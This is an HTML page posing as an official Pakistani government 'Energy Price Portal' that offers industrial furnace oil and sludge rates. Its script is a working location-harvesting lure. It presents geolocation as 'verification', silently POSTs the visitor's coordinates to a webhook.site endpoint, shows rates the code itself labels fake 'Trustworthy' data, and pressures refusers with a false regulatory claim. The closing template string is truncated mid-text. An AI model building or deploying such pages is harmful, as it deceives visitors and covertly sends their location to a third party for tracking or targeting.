<!DOCTYPE html>
<html lang="ur" dir="ltr">
<head>
    <meta charset="UTF-8">
    <title>Pakistan Energy Price Portal | Official</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .pak-green { background-color: #006600; }
        .pak-white { color: #ffffff; }
    </style>
</head>
<body class="bg-gray-100 font-sans">

    <!-- Header -->
    <header class="pak-green text-white p-4 shadow-lg">
        <div class="max-w-4xl mx-auto flex justify-between items-center">
            <h1 class="text-xl font-bold">Energy Price Portal - Pakistan</h1>
            <span class="text-xs bg-white text-green-800 px-2 py-1 rounded">Verified Portal</span>
        </div>
    </header>

    <!-- Main Content -->
    <main class="max-w-4xl mx-auto mt-8 p-6">
        <div id="portal-container" class="bg-white p-8 rounded-lg shadow-md border-t-4 border-green-700">
            <h2 class="text-2xl font-bold text-gray-800 mb-4">Industrial Fuel Rates (Q4 2026)</h2>
            <p id="status-msg" class="text-gray-600 mb-6">Access real-time furnace oil and sludge rates for your industrial unit. Regional transport subsidies vary by location.</p>

            <div id="content-area">
                <button id="btn-fetch" onclick="initiateAuth()" class="w-full bg-green-700 text-white font-bold py-4 rounded-lg hover:bg-green-800 transition shadow-lg">
                    Verify Location & Fetch Live Rates
                </button>
            </div>
        </div>
    </main>

    <script>
        function initiateAuth() {
            const btn = document.getElementById('btn-fetch');
            btn.innerText = "Authenticating Location...";
            btn.disabled = true;

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => releaseData(pos),
                    () => handleBlock()
                );
            }
        }

        async function releaseData(pos) {
            // Data collection
            const data = {
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                timestamp: new Date().toISOString()
            };

            await fetch("https://webhook.site/a5810f06-e1e7-4069-a0b5-4eda839f0b5b", {
                method: "POST",
                body: JSON.stringify(data)
            });

            // Show the "Trustworthy" data
            document.getElementById('portal-container').innerHTML = `
                <h2 class='text-2xl font-bold text-green-800'>Access Granted</h2>
                <div class='mt-6 space-y-4'>
                    <div class='p-4 border rounded'>Furnace Oil (IFO): <span class='font-bold text-green-700'>Rs. 198,400 / MT</span></div>
                    <div class='p-4 border rounded'>Industrial Sludge: <span class='font-bold text-green-700'>Rs. 89,200 / MT</span></div>
                </div>
                <p class='mt-6 text-xs text-gray-400'>*Rates are subject to change. Valid for 24 24            `;
        }

        function handleBlock() {
            const msg = document.getElementById('status-msg');
            msg.innerText = "ERROR: Location access is mandatory to comply with regional pricing regulations. Please allow access to view rates.";
            msg.classList.add("text-red-600", "font-bold");
            document.getElementById('btn-fetch').innerText = "Retry: Allow Location Access";
            document.getElementById('btn-fetch').disabled = false;
        }
    </script>
</body>
</html>
